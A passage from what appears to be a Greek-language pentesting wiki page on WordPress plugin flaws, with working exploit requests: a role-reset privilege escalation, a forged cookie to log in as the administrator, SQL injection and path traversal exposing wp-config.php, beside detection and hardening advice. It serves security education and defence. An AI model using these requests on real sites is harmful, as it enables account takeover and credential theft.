foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Γιατί είναι εκμεταλλεύσιμο

- Εμπιστεύεται `$_REQUEST['reset-for']` και ένα plugin option χωρίς server-side authorization.
- Αν ένας χρήστης είχε προηγουμένως υψηλότερα προνόμια αποθηκευμένα στο `_asenha_view_admin_as_original_roles` και υποβαθμίστηκε, μπορεί να τα επαναφέρει χτυπώντας το reset path.
- Σε κάποιες αναπτύξεις, οποιοδήποτε authenticated user θα μπορούσε να προκαλέσει ένα reset για άλλο username που εξακολουθεί να υπάρχει στο `viewing_admin_as_role_are` (broken authorization).

Attack prerequisites

- Ευάλωτη έκδοση plugin με το feature ενεργοποιημένο.
- Ο target account έχει ένα stale high-privilege role αποθηκευμένο στα user meta από προηγούμενη χρήση.
- Οποιαδήποτε authenticated session; απουσία nonce/capability στη reset flow.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Σε ευάλωτες εκδόσεις αυτό αφαιρεί τους τρέχοντες ρόλους και επαναπροσθέτει τους αποθηκευμένους αρχικούς ρόλους (π.χ., `administrator`), αυξάνοντας ουσιαστικά τα προνόμια.

Detection checklist

- Αναζητήστε δυνατότητες αλλαγής ρόλου που διατηρούν τους “αρχικούς ρόλους” στο user meta (π.χ., `_asenha_view_admin_as_original_roles`).
- Εντοπίστε μονοπάτια reset/restore που:
- Διαβάζουν ονόματα χρήστη από `$_REQUEST` / `$_GET` / `$_POST`.
- Τροποποιούν ρόλους μέσω `add_role()` / `remove_role()` χωρίς `current_user_can()` και `wp_verify_nonce()` / `check_admin_referer()`.
- Εξουσιοδοτούν βάσει ενός πίνακα επιλογών plugin (π.χ., `viewing_admin_as_role_are`) αντί των δυνατοτήτων (capabilities) του χρήστη που ενεργεί.

Hardening

- Επιβάλετε ελέγχους capabilities σε κάθε κλάδο που αλλάζει κατάσταση (π.χ., `current_user_can('manage_options')` ή αυστηρότερο).
- Απαιτήστε nonces για όλες τις μεταβολές ρόλων/αδειών και επαληθεύστε τα: `check_admin_referer()` / `wp_verify_nonce()`.
- Μην εμπιστεύεστε ποτέ ονόματα χρήστη που παρέχονται από το αίτημα· επιλύστε τον στοχευόμενο χρήστη στον διακομιστή με βάση τον πιστοποιημένο χρήστη και την ρητή πολιτική.
- Ακυρώστε την κατάσταση των “αρχικών ρόλων” σε ενημερώσεις προφίλ/ρόλων για να αποφευχθεί η επαναφορά παρωχημένων υψηλών προνομίων:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Σκεφθείτε την αποθήκευση ελάχιστης κατάστασης και τη χρήση χρονικά περιορισμένων, capability‑προστατευμένων tokens για προσωρινές αλλαγές ρόλων.

---

### Unauthenticated privilege escalation μέσω cookie‑trusted user switching στο δημόσιο `init` (Service Finder “sf-booking”)

Μερικά plugins δεσμεύουν user-switching helpers στο δημόσιο hook `init` και εξάγουν την ταυτότητα από ένα cookie που ελέγχεται από τον client. Αν ο κώδικας καλέσει `wp_set_auth_cookie()` χωρίς έλεγχο του authentication, της capability και ενός έγκυρου nonce, οποιοσδήποτε unauthenticated επισκέπτης μπορεί να αναγκάσει login ως οποιοδήποτε user ID.

Τυπικό ευάλωτο μοτίβο (απλοποιημένο από Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Γιατί είναι εκμεταλλεύσιμο

- Ο δημόσιος `init` hook κάνει τον χειριστή προσβάσιμο από μη αυθεντικοποιημένους χρήστες (χωρίς έλεγχο `is_user_logged_in()`).
- Η ταυτότητα προκύπτει από ένα cookie που μπορεί να τροποποιηθεί από τον client (`original_user_id`).
- Άμεση κλήση σε `wp_set_auth_cookie($uid)` συνδέει τον αιτούντα ως αυτόν τον χρήστη χωρίς έλεγχο capability/nonce.

Εκμετάλλευση (χωρίς αυθεντικοποίηση)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Σκέψεις WAF για WordPress/plugin CVEs

Τα γενικά edge/server WAFs είναι ρυθμισμένα για ευρεία πρότυπα (SQLi, XSS, LFI). Πολλές ευπάθειες υψηλού αντίκτυπου σε WordPress/plugin είναι σφάλματα λογικής ή auth στην εφαρμογή που φαίνονται ως αβλαβής κίνηση, εκτός αν η μηχανή κατανοεί τα WordPress routes και τη σημασιολογία του plugin.

Επιθετικές σημειώσεις

- Στοχεύστε endpoints ειδικά για το plugin με καθαρά payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Δοκιμάστε πρώτα unauth paths (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads συχνά πετυχαίνουν χωρίς obfuscation.
- Τυπικές περιπτώσεις υψηλού αντίκτυπου: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Αμυντικές σημειώσεις

- Μην βασίζεστε σε γενικές WAF υπογραφές για να προστατέψετε plugin CVEs. Εφαρμόστε virtual patches σε επίπεδο application-layer, ειδικά για την ευπάθεια, ή αναβαθμίστε γρήγορα.
- Προτιμήστε positive-security checks στον κώδικα (capabilities, nonces, strict input validation) αντί για αρνητικά φίλτρα regex.

## Προστασία WordPress

### Τακτικές ενημερώσεις

Βεβαιωθείτε ότι το WordPress, τα plugins και τα themes είναι ενημερωμένα. Επίσης επιβεβαιώστε ότι η αυτόματη ενημέρωση είναι ενεργοποιημένη στο wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Επίσης, **εγκαταστήστε μόνο αξιόπιστα πρόσθετα και θέματα του WordPress**.

### Πρόσθετα Ασφαλείας

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Άλλες Συστάσεις**

- Αφαιρέστε τον προεπιλεγμένο χρήστη **admin**
- Χρησιμοποιήστε **ισχυρούς κωδικούς πρόσβασης** και **2FA**
- Περιοδικά **επανεξετάζετε** τα **δικαιώματα** των χρηστών
- **Περιορίστε τις προσπάθειες σύνδεσης** για να αποτρέψετε επιθέσεις Brute Force
- Μετονομάστε το αρχείο **`wp-admin.php`** και επιτρέψτε πρόσβαση μόνο εσωτερικά ή από συγκεκριμένες διευθύνσεις IP.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

Το πρόσθετο προσλήψεων WP Job Portal εξέθεσε μια εργασία **savecategory** που τελικά εκτελεί τον ακόλουθο ευπαθή κώδικα μέσα στο `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Προβλήματα που εισάγονται από αυτό το απόσπασμα:

1. **Μη-φιλτραρισμένη είσοδος χρήστη** – `parentid` προέρχεται απευθείας από το HTTP request.
2. **Συνένωση συμβολοσειρών μέσα στο WHERE clause** – δεν υπάρχει `is_numeric()` / `esc_sql()` / prepared statement.
3. **Προσβασιμότητα χωρίς αυθεντικοποίηση** – παρόλο που η ενέργεια εκτελείται μέσω του `admin-post.php`, ο μόνος έλεγχος που υπάρχει είναι ένα **CSRF nonce** (`wp_verify_nonce()`), το οποίο οποιοσδήποτε επισκέπτης μπορεί να ανακτήσει από μια δημόσια σελίδα που ενσωματώνει το shortcode `[wpjobportal_my_resumes]`.

#### Εκμετάλλευση

1. Πάρτε ένα νέο nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Κάντε ενέγχυση αυθαίρετου SQL εκμεταλλευόμενοι το `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Η απάντηση αποκαλύπτει το αποτέλεσμα του εισαχθέντος ερωτήματος ή τροποποιεί τη βάση δεδομένων, αποδεικνύοντας SQLi.


### Μη-επαληθευμένη Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Μια άλλη ενέργεια, **downloadcustomfile**, επέτρεπε στους επισκέπτες να κατεβάζουν **οποιοδήποτε αρχείο στο δίσκο** μέσω path traversal. Ο ευάλωτος sink βρίσκεται στο `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ελέγχεται από attacker και συνενώνεται **without sanitisation**.  Ξανά, η μόνη προστασία είναι ένα **CSRF nonce** που μπορεί να ανακτηθεί από τη σελίδα resume.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Ο server αποκρίνεται με τα περιεχόμενα του `wp-config.php`, leaking DB credentials and auth keys.

## Αναφορές

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
